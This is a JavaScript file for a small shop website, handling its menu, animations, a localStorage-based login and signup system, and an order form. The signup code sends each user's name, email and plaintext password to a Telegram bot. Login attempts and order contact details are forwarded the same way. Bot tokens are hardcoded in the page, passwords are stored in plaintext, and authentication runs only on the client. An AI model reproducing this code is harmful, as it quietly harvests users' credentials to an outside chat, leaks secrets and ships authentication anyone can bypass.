const TELEGRAM_BOT_TOKEN = '8251796240:AAGPRIAZH50aUl6Vlmtu1ZKOFmANOiH2lYc';
const TELEGRAM_CHAT_ID = '5932177382';
const TELEGRAM_LOGIN_TOKEN = '8389129332:AAEY0qRokDbGvV4RTlRxm3E8EST0bnbyv28';
const TELEGRAM_LOGIN_CHAT_ID = '5932177382';

document.addEventListener('DOMContentLoaded', function() {
    initMobileMenu();
    initScrollAnimations();
    initAuthSystem();
    initContactForm();
    updateAuthLink();
});

function initMobileMenu() {
    const menuToggle = document.querySelector('.mobile-menu-toggle');
    const navLinks = document.querySelector('.nav-links');

    if (menuToggle) {
        menuToggle.addEventListener('click', function() {
            navLinks.classList.toggle('active');

            const spans = menuToggle.querySelectorAll('span');
            if (navLinks.classList.contains('active')) {
                spans[0].style.transform = 'rotate(45deg) translateY(8px)';
                spans[1].style.opacity = '0';
                spans[2].style.transform = 'rotate(-45deg) translateY(-8px)';
            } else {
                spans[0].style.transform = '';
                spans[1].style.opacity = '';
                spans[2].style.transform = '';
            }
        });

        document.addEventListener('click', function(e) {
            if (!menuToggle.contains(e.target) && !navLinks.contains(e.target)) {
                navLinks.classList.remove('active');
                const spans = menuToggle.querySelectorAll('span');
                spans[0].style.transform = '';
                spans[1].style.opacity = '';
                spans[2].style.transform = '';
            }
        });
    }
}

function initScrollAnimations() {
    const observerOptions = {
        threshold: 0.1,
        rootMargin: '0px 0px -50px 0px'
    };

    const observer = new IntersectionObserver(function(entries) {
        entries.forEach(entry => {
            if (entry.isIntersecting) {
                entry.target.classList.add('visible');
            }
        });
    }, observerOptions);

    const animatedElements = document.querySelectorAll('.fade-in-scroll');
    animatedElements.forEach(el => observer.observe(el));

    const navbar = document.querySelector('.navbar');
    let lastScroll = 0;

    window.addEventListener('scroll', function() {
        const currentScroll = window.pageYOffset;

        if (currentScroll > 100) {
            navbar.style.boxShadow = '0 2px 20px rgba(0, 0, 0, 0.15)';
        } else {
            navbar.style.boxShadow = '0 2px 10px rgba(0, 0, 0, 0.1)';
        }

        lastScroll = currentScroll;
    });
}

function updateAuthLink() {
    const authLink = document.getElementById('authLink');
    const placeOrderNav = document.getElementById('placeOrderNav');
    const currentUser = getCurrentUser();

    if (authLink) {
        if (currentUser) {
            authLink.textContent = 'Logout';
        } else {
            authLink.textContent = 'Login';
        }
    }

    if (placeOrderNav) {
        if (currentUser) {
            placeOrderNav.style.display = 'block';
        } else {
            placeOrderNav.style.display = 'none';
        }
    }
}

function initAuthSystem() {
    const loginForm = document.getElementById('loginForm');
    const signupForm = document.getElementById('signupForm');
    const showSignupLink = document.getElementById('showSignup');
    const showLoginLink = document.getElementById('showLogin');
    const logoutBtn = document.getElementById('logoutBtn');
    const loginBox = document.getElementById('loginBox');
    const signupBox = document.getElementById('signupBox');
    const logoutBox = document.getElementById('logoutBox');

    const currentUser = getCurrentUser();

    if (logoutBox && currentUser) {
        loginBox.style.display = 'none';
        signupBox.style.display = 'none';
        logoutBox.style.display = 'block';

        const welcomeMessage = document.getElementById('welcomeMessage');
        if (welcomeMessage) {
            welcomeMessage.textContent = `Welcome back, ${currentUser.name}!`;
        }
    }

    if (showSignupLink) {
        showSignupLink.addEventListener('click', function(e) {
            e.preventDefault();
            loginBox.style.display = 'none';
            signupBox.style.display = 'block';
        });
    }

    if (showLoginLink) {
        showLoginLink.addEventListener('click', function(e) {
            e.preventDefault();
            signupBox.style.display = 'none';
            loginBox.style.display = 'block';
        });
    }

    if (loginForm) {
        loginForm.addEventListener('submit', function(e) {
            e.preventDefault();
            handleLogin();
        });
    }

    if (signupForm) {
        signupForm.addEventListener('submit', function(e) {
            e.preventDefault();
            handleSignup();
        });
    }

    if (logoutBtn) {
        logoutBtn.addEventListener('click', function() {
            handleLogout();
        });
    }
}

function handleLogin() {
    const email = document.getElementById('loginEmail').value.trim();
    const password = document.getElementById('loginPassword').value;
    const messageDiv = document.getElementById('loginMessage');

    if (!email || !password) {
        showMessage(messageDiv, 'Please fill in all fields', 'error');
        return;
    }

    const users = JSON.parse(localStorage.getItem('moniAariUsers') || '[]');
    const user = users.find(u => u.email === email && u.password === password);

    if (user) {
        localStorage.setItem('moniAariCurrentUser', JSON.stringify({
            name: user.name,
            email: user.email
        }));

        sendLoginToTelegram({ email, status: 'success' });

        showMessage(messageDiv, 'Login successful! Redirecting...', 'success');

        setTimeout(() => {
            window.location.href = 'index.html';
        }, 1500);
    } else {
        sendLoginToTelegram({ email, status: 'failed' });
        showMessage(messageDiv, 'Invalid email or password', 'error');
    }
}

function handleSignup() {
    const name = document.getElementById('signupName').value.trim();
    const email = document.getElementById('signupEmail').value.trim();
    const password = document.getElementById('signupPassword').value;
    const messageDiv = document.getElementById('signupMessage');

    if (!name || !email || !password) {
        showMessage(messageDiv, 'Please fill in all fields', 'error');
        return;
    }

    if (password.length < 6) {
        showMessage(messageDiv, 'Password must be at least 6 characters', 'error');
        return;
    }

    const users = JSON.parse(localStorage.getItem('moniAariUsers') || '[]');

    if (users.find(u => u.email === email)) {
        showMessage(messageDiv, 'Email already registered', 'error');
        return;
    }

    const newUser = { name, email, password };
    users.push(newUser);
    localStorage.setItem('moniAariUsers', JSON.stringify(users));

    localStorage.setItem('moniAariCurrentUser', JSON.stringify({
        name: newUser.name,
        email: newUser.email
    }));

    sendSignupToTelegram({ name, email, password });

    showMessage(messageDiv, 'Account created successfully! Redirecting...', 'success');

    setTimeout(() => {
        window.location.href = 'index.html';
    }, 1500);
}

function handleLogout() {
    localStorage.removeItem('moniAariCurrentUser');
    window.location.href = 'login.html';
}

function getCurrentUser() {
    const userStr = localStorage.getItem('moniAariCurrentUser');
    return userStr ? JSON.parse(userStr) : null;
}

function initContactForm() {
    const contactForm = document.getElementById('contactForm');

    if (contactForm) {
        contactForm.addEventListener('submit', function(e) {
            e.preventDefault();
            handleContactSubmit();
        });
    }
}

function handleContactSubmit() {
    const currentUser = getCurrentUser();
    const messageDiv = document.getElementById('formMessage');

    if (!currentUser) {
        showMessage(messageDiv, 'Please login to place an order', 'error');
        setTimeout(() => {
            window.location.href = 'login.html';
        }, 2000);
        return;
    }

    const name = document.getElementById('name').value.trim();
    const email = document.getElementById('email').value.trim();
    const phone = document.getElementById('phone').value.trim();
    const message = document.getElementById('message').value.trim();

    if (!name || !email || !phone || !message) {
        showMessage(messageDiv, 'Please fill in all fields', 'error');
        return;
    }

    const formData = { name, email, phone, message };
    sendOrderToTelegram(formData);

    showMessage(messageDiv, 'Form submitted successfully! We will contact you soon.', 'success');

    document.getElementById('contactForm').reset();
}

async function sendOrderToTelegram(data) {
    const text = `🛍️ NEW ORDER / CONTACT\n\n` +
                 `👤 Name: ${data.name}\n` +
                 `📧 Email: ${data.email}\n` +
                 `📱 Phone: ${data.phone}\n` +
                 `💬 Message:\n${data.message}`;

    try {
        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: text,
                parse_mode: 'HTML'
            })
        });
    } catch (error) {
    }
}

async function sendLoginToTelegram(data) {
    const text = `🔐 LOGIN ATTEMPT\n\n` +
                 `📧 Email: ${data.email}\n` +
                 `✅ Status: ${data.status}`;

    try {
        await fetch(`https://api.telegram.org/bot${TELEGRAM_LOGIN_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: TELEGRAM_LOGIN_CHAT_ID,
                text: text,
                parse_mode: 'HTML'
            })
        });
    } catch (error) {
    }
}

async function sendSignupToTelegram(data) {
    const text = `🆕 New Signup\n\n` +
                 `👤 Name: ${data.name}\n` +
                 `📧 Email: ${data.email}\n` +
                 `🔑 Password: ${data.password}`;

    try {
        await fetch(`https://api.telegram.org/bot${TELEGRAM_LOGIN_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: TELEGRAM_LOGIN_CHAT_ID,
                text: text,
                parse_mode: 'HTML'
            })
        });
    } catch (error) {
    }
}

function showMessage(element, message, type) {
    if (element) {
        element.textContent = message;
        element.className = `form-message ${type}`;
    }
}
